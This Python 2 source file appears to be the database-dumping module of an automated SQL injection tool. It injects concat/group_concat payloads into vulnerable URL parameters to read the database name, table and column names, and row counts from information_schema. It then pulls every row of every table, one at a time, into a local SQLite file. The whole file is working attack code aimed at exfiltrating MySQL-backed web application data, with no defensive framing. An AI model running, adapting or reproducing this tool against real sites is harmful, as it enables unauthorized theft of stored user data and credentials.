import os
import sqlite3
import urllib2
import urllib
import urlparse
import time
import BeautifulSoup
import re

from termcolor import colored, cprint

from functions import *
func = functions()

class DBDump:

	def __init__(self):
		self.tbl_names = []
		self.col_names = []
		self.tbl_overview = {}
		self.start_tag 	= "<tag>"
		self.finish_tag	= "<\/tag>"
		self.col_length = 20
		self.db_file = ""
		self.dbname = ""
		self.varsql = ""
		self.conn = ""

	def start(self, mysqlvulns, target):
		parsed_uri = urlparse.urlparse(target)
		self.db_file = parsed_uri.netloc + "-dump.db"
		self.conn = self.createDB(self.db_file)
		for sqlurl, sqlnum in iter(mysqlvulns.iteritems()):
			self.varsql = self.testVar(sqlurl, sqlnum)
			self.dbname = self.getDBName()
			print colored("[+] [{1}] DataBase: {0}".format(self.dbname, func.showTime()), "white", "on_blue")
			tblnames = self.getTableNames(self.varsql, self.dbname)
			print colored("[+] [{1}] Tables: {0}".format(tblnames, func.showTime()), "white", "on_blue")
			for tblname in tblnames:
				if tblname <> "log":
					strcolnames = ""
					colnames = self.getColumnNames(self.varsql, self.dbname, tblname)
					for colname in colnames:
						strcolnames += colname + "||"
					self.tbl_overview[tblname] = strcolnames
			self.saveStructure(self.varsql, self.dbname, self.tbl_overview)
			self.dumpData(self.varsql, self.dbname, self.tbl_overview)
			self.conn.close()

			break
		return False

	def display(self):
		self.printStructure(self.varsql, self.dbname, self.tbl_overview)

	def testVar(self, sqlurl, sqlnum):
		for x in range(1, sqlnum + 1):
			newurl = self.replacenth(sqlurl, "NULL", "'[XX]'", x)
			content = urllib2.urlopen(newurl).read()
			if "[XX]" in content:
				return newurl

	def findnth(self, source, target, n):
	    num = 0
	    start = -1
	    while num < n:
	        start = source.find(target, start+1)
	        if start == -1: return -1
	        num += 1
	    return start

	def replacenth(self, source, old, new, n):
		p = self.findnth(source, old, n)
		if n == -1: return source
		return source[:p] + new + source[p+len(old):]

	def sqlRequest(self, httpsql):
		content = urllib2.urlopen(httpsql).read()
		for item in content.split("</tag>"):
			if "" + self.start_tag + "" in item:
				return item [ item.find("" + self.start_tag + "")+len("" + self.start_tag + "") : ]

	def getDBName(self):
		httpsql = self.varsql.replace("'[XX]'", "concat('" + self.start_tag + "',database(),'" + self.finish_tag + "')");
		return self.sqlRequest(httpsql)

	def getNumTables(self):
	    httpsql = self.varsql.replace("'[XX]'", "concat('" + self.start_tag + "',count(*),'" + self.finish_tag + "')");
	    httpsql += "%20FROM%20information_schema.tables%20WHERE%20table_schema='" + self.dbname + "'"
	    return self.sqlRequest(httpsql)

	def getTableNames(self, varsql, dbname):
		tbl_names = []
		httpsql = varsql.replace("'[XX]'", "(select%20group_concat(%27" + self.start_tag + "%27,table_name,%27" + self.finish_tag + "%27)%20FROM%20information_schema.tables%20WHERE%20table_schema=%27" + dbname + "%27)");
		if "order%20by" in httpsql:
			httpsql = httpsql.replace("%20order%20by%20%271", "")
			httpsql += "%20order%20by%20%271"
		content = urllib2.urlopen(httpsql).read()
		for item in content.split("</tag>"):
			if "" + self.start_tag + "" in item: 
				tblname = item [ item.find("" + self.start_tag + "")+len("" + self.start_tag + "") : ]
				tbl_names.append(tblname)
		return tbl_names

	def getColumnNames(self, varsql, dbname, tblname):
		col_names = []
		httpsql = varsql.replace("'[XX]'", "(select%20group_concat(%27" + self.start_tag + "%27,concat(column_name,%27|%27,column_type),%27" + self.finish_tag + "%27)%20FROM%20information_schema.columns%20WHERE%20table_schema=%27" + dbname + "%27%20and%20table_name=%27" + tblname + "%27)");
		if "order%20by" in httpsql:
			httpsql = httpsql.replace("%20order%20by%20%271", "")
			httpsql += "%20order%20by%20%271"
		content = urllib2.urlopen(httpsql).read()
		for item in content.split("</tag>"):
			if "" + self.start_tag + "" in item: 
				colname = item [ item.find("" + self.start_tag + "")+len("" + self.start_tag + "") : ]
				col_names.append(colname)
		return col_names

	def printStructure(self, varsql, dbname, tbl_overview):
		print " Database: {0}".format(dbname)
		for tblname, strcolnames in iter(tbl_overview.iteritems()):
			print ""
			start_create = "CREATE TABLE " + tblname + " ("
			createsql = start_create
			numrows = self.getNumRows(varsql, tblname)
			print " +" + ("-" * (self.col_length * 2)) + "+"
			print " | Table: " + tblname + "(" + numrows + ")" + (" " * ((self.col_length * 2) - len(tblname) - 10 - len(numrows))) + "|"
			print " +" + ("-" * (self.col_length * 2)) + "+"
			columns = strcolnames.split("||")
			for column in columns:
				split = column.split("|")
				if len(split[0]) > 0:
					print " | " + split[0] + (" " * (self.col_length - len(split[0]) - 1)) + "| " + split[1] + (" " * (self.col_length - len(split[1]) - 2)) + "|"
					if createsql <> start_create:
						createsql += ","
					createsql += split[0] + " TEXT"
			print " +" + ("-" * (self.col_length * 2)) + "+"
			createsql += ")"
			self.conn.execute(createsql)

	def saveStructure(self, varsql, dbname, tbl_overview):
		for tblname, strcolnames in iter(tbl_overview.iteritems()):
			start_create = "CREATE TABLE " + tblname + " ("
			createsql = start_create
			numrows = self.getNumRows(varsql, tblname)
			columns = strcolnames.split("||")
			for column in columns:
				split = column.split("|")
				if len(split[0]) > 0:
					if createsql <> start_create:
						createsql += ","
					createsql += split[0] + " TEXT"
			createsql += ")"
			self.conn.execute(createsql)

	def getNumRows(self, varsql, tblname):
		#httpsql = varsql.replace("'[XX]'", "concat('" + self.start_tag + "',count(*),'" + self.finish_tag + "')");
		httpsql = varsql.replace("'[XX]'", "concat('<tag>',(select%20count(*)%20from%20" + tblname + "),'</tag>')");
		httpsql += "%20FROM%20" + tblname
		return self.sqlRequest(httpsql)

	def createDB(self, db_file):
		if os.path.isfile(db_file):
			os.remove(db_file)
		return sqlite3.connect(db_file)

	def escape_html(self, html):
		return html.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace("'", '&#39;')

	def dumpData(self, varsql, dbname, tbl_overview):
		cursor = self.conn.cursor()
		size_alert = False
		for tblname, strcolnames in iter(tbl_overview.iteritems()):
			print colored("[+] [{1}] Dumping Table: {0}".format(tblname, func.showTime()), "cyan")
			columns = strcolnames.split("||")
			start_con = "concat('<tag>',(select%20concat("
			concat = start_con
			firstcol = None
			newcols = []
			for column in columns:
				splitcols = column.split("|")
				if splitcols[0]:
					newcols.append(splitcols[0])
			firstcol = newcols[0];
			concat += ",'|||',".join(newcols)
			concat += ")%20from%20" + tblname + "%20[LIMIT]),'<\/tag>')"
			numrows = self.getNumRows(varsql, tblname)
			httpsql = varsql.replace("'[XX]'", concat);
			if "order%20by" in httpsql:
				httpsql = httpsql.replace("%20order%20by%20%271", "")
				httpsql += "%20order%20by%20%271"
			lastins = 0
			#print "Rows: {0}".format(numrows)
			for x in range(1, (int(numrows)+1)):
				rangesql = httpsql.replace("[LIMIT]", "%20where%20" + firstcol + "%20>%20" + str(lastins) + "%20order%20by%20" + firstcol + "%20asc%20LIMIT%201")
				#print rangesql
				content = urllib2.urlopen(rangesql).read()
				for item in content.split("</tag>"):
					if "" + self.start_tag + "" in item: 
						retval = item [ item.find("" + self.start_tag + "")+len("" + self.start_tag + "") : ]
						items = retval.split("|||")
						db_size = os.stat(self.db_file).st_size 
						addstartsql = "INSERT INTO " + tblname + " VALUES ("
						addsql = addstartsql
						lastins = items[0]
						for data in items:
							if addstartsql <> addsql:
								addsql += ","
							addsql += "'" + self.escape_html(data) + "'"
						addsql += ");"
						#print addsql
						cursor.execute(addsql)
						# 2GB = 2000000000
						if db_size > 2000000000 and size_alert == False:
							print colored("[+] [{1}] WARNING: Local database file is over 2GB", "red")
							size_alert = True

		self.conn.commit()